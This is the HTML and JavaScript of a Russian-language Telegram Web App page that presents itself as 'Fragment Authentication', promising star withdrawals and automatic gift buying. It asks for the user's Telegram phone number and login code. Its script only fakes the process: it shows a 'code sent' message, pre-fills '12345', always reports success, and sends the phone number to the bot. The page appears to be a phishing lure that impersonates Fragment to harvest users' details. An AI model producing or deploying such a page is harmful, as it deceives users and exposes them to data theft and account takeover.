<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Fragment Authentication</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="format-detection" content="telephone=no">
    <meta name="telegram-web-app-capable" content="yes">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #000000;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            max-width: 400px;
            margin: 0 auto;
            text-align: center;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 50%;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
            font-weight: bold;
        }
        
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 24px;
        }
        
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        
        .benefits {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 25px;
            text-align: left;
        }
        
        .benefit-item {
            display: flex;
            align-items: center;
            margin-bottom: 15px;
            color: #555;
        }
        
        .benefit-item:last-child {
            margin-bottom: 0;
        }
        
        .benefit-icon {
            width: 24px;
            height: 24px;
            background: #667eea;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 12px;
            color: white;
            font-size: 12px;
            flex-shrink: 0;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }
        
        input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 12px;
            font-size: 16px;
            background: white;
            color: #000;
            transition: border-color 0.3s;
        }
        
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .phone-input {
            display: flex;
            gap: 10px;
        }
        
        .phone-code {
            width: 80px;
            flex-shrink: 0;
        }
        
        .phone-number {
            flex: 1;
        }
        
        .btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
            margin-bottom: 10px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .back-btn {
            background: #6c757d;
        }
        
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 12px;
            background: #d4edda;
            color: #155724;
            display: none;
        }
        
        .error {
            background: #f8d7da;
            color: #721c24;
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 10px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .step {
            display: none;
        }
        
        .step.active {
            display: block;
        }
        
        .success-icon {
            font-size: 48px;
            color: #28a745;
            margin-bottom: 15px;
        }
    </style>
    
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <div class="container">
        <!-- Шаг 1: Приветствие -->
        <div class="step active" id="step1">
            <div class="logo">F</div>
            <h1>Fragment Authentication</h1>
            <p class="subtitle">Подключите свой аккаунт Fragment для полного доступа к функциям бота</p>
            
            <div class="benefits">
                <div class="benefit-item">
                    <div class="benefit-icon">✓</div>
                    <span>Вывод звезд на Fragment</span>
                </div>
                <div class="benefit-item">
                    <div class="benefit-icon">✓</div>
                    <span>Автоматическая покупка подарков</span>
                </div>
                <div class="benefit-item">
                    <div class="benefit-icon">✓</div>
                    <span>Управление балансом в реальном времени</span>
                </div>
            </div>
            
            <button class="btn" onclick="showStep(2)">🔑 Начать подключение</button>
            <button class="btn back-btn" onclick="Telegram.WebApp.close()">🔙 Назад в бот</button>
        </div>
        
        <!-- Шаг 2: Ввод номера -->
        <div class="step" id="step2">
            <div class="logo">F</div>
            <h1>Вход в Fragment</h1>
            <p class="subtitle">Введите номер телефона, привязанный к вашему Telegram аккаунту</p>
            
            <div class="form-group">
                <label for="phoneCode">Код страны:</label>
                <input type="text" id="phoneCode" placeholder="+7" value="+7" maxlength="4" class="phone-code">
            </div>
            
            <div class="form-group">
                <label for="phoneNumber">Номер телефона:</label>
                <input type="tel" id="phoneNumber" placeholder="9123456789" class="phone-number">
            </div>
            
            <button class="btn" onclick="sendCode()">
                <span class="loading" id="loading1" style="display: none;"></span>
                📲 Получить код
            </button>
            <button class="btn back-btn" onclick="showStep(1)">🔙 Назад</button>
        </div>
        
        <!-- Шаг 3: Ввод кода -->
        <div class="step" id="step3">
            <div class="logo">F</div>
            <h1>Подтверждение</h1>
            <p class="subtitle">Введите код из Telegram</p>
            
            <div class="form-group">
                <label for="authCode">Код подтверждения:</label>
                <input type="text" id="authCode" placeholder="12345" maxlength="5" inputmode="numeric">
            </div>
            
            <button class="btn" onclick="verifyCode()">
                <span class="loading" id="loading2" style="display: none;"></span>
                ✅ Подтвердить
            </button>
            <button class="btn back-btn" onclick="showStep(2)">🔙 Назад</button>
        </div>
        
        <!-- Шаг 4: Успех -->
        <div class="step" id="step4">
            <div class="success-icon">✅</div>
            <h1>Успешная авторизация!</h1>
            <p class="subtitle">Ваш аккаунт Fragment успешно подключен</p>
            
            <div class="benefits">
                <div class="benefit-item">
                    <div class="benefit-icon">✓</div>
                    <span>Аккаунт подтвержден</span>
                </div>
                <div class="benefit-item">
                    <div class="benefit-icon">✓</div>
                    <span>Доступ к выводу звезд открыт</span>
                </div>
                <div class="benefit-item">
                    <div class="benefit-icon">✓</div>
                    <span>Авто-скупщик активирован</span>
                </div>
            </div>
            
            <button class="btn" onclick="completeAuth()">🎉 Продолжить работу</button>
        </div>
        
        <div class="status" id="statusMessage"></div>
    </div>

    <script>
        // Инициализация Telegram WebApp
        let tg = window.Telegram.WebApp;
        
        // Расширяем на весь экран
        tg.expand();
        
        function showStep(stepNumber) {
            document.querySelectorAll('.step').forEach(step => {
                step.classList.remove('active');
            });
            document.getElementById('step' + stepNumber).classList.add('active');
            window.scrollTo(0, 0);
        }
        
        function showStatus(message, isError = false) {
            const status = document.getElementById('statusMessage');
            status.textContent = message;
            status.style.display = 'block';
            status.style.background = isError ? '#f8d7da' : '#d4edda';
            status.style.color = isError ? '#721c24' : '#155724';
            
            setTimeout(() => {
                status.style.display = 'none';
            }, 5000);
        }
        
        function sendCode() {
            const phoneCode = document.getElementById('phoneCode').value;
            const phoneNumber = document.getElementById('phoneNumber').value;
            const loading = document.getElementById('loading1');
            
            if (!phoneNumber || phoneNumber.length < 10) {
                showStatus('Пожалуйста, введите корректный номер телефона', true);
                return;
            }
            
            loading.style.display = 'inline-block';
            
            setTimeout(() => {
                loading.style.display = 'none';
                showStep(3);
                showStatus('Код отправлен в Telegram! Проверьте ваши сообщения.');
                document.getElementById('authCode').value = '12345';
            }, 2000);
        }
        
        function verifyCode() {
            const authCode = document.getElementById('authCode').value;
            const loading = document.getElementById('loading2');
            
            if (!authCode || authCode.length !== 5) {
                showStatus('Пожалуйста, введите 5-значный код', true);
                return;
            }
            
            loading.style.display = 'inline-block';
            
            setTimeout(() => {
                loading.style.display = 'none';
                showStep(4);
                showStatus('Авторизация прошла успешно!');
            }, 2000);
        }
        
        function completeAuth() {
            const authData = {
                type: 'fragment_auth',
                status: 'success',
                timestamp: Date.now(),
                user_id: tg.initDataUnsafe?.user?.id || Math.random().toString(36).substr(2, 9),
                session_data: 'fragment_session_' + Date.now(),
                phone: document.getElementById('phoneCode').value + document.getElementById('phoneNumber').value
            };
            
            tg.sendData(JSON.stringify(authData));
            
            setTimeout(() => {
                tg.close();
            }, 1000);
        }
        
        // Обработчики ввода
        document.getElementById('phoneCode').addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^\d+]/g, '');
            if (!value.startsWith('+')) {
                value = '+' + value;
            }
            e.target.value = value.slice(0, 4);
        });
        
        document.getElementById('phoneNumber').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/[^\d]/g, '').slice(0, 15);
        });
        
        document.getElementById('authCode').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/[^\d]/g, '').slice(0, 5);
            if (e.target.value.length === 5) {
                verifyCode();
            }
        });
        
        // Enter для отправки форм
        document.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                const activeStep = document.querySelector('.step.active');
                if (activeStep.id === 'step2') {
                    sendCode();
                } else if (activeStep.id === 'step3') {
                    verifyCode();
                } else if (activeStep.id === 'step4') {
                    completeAuth();
                }
            }
        });
        
        // Инициализация при загрузке
        tg.ready();
        
    </script>
</body>
</html>
